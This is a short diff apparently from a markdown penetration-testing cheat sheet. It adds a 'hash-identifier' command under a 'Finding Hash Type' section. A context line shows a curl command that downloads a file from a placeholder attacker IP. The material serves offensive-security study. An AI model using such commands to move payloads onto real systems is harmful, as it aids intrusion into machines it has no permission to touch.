@@ -538,6 +538,9 @@ curl http://<attacker-ip>/<file> -o <output_file>
 
 <details> <summary><strong>Finding Hash Type</strong></summary>
 
+```bash
+hash-identifier <hash>
+```
 </details>
 
 <details> <summary><strong>hashcat</strong></summary>
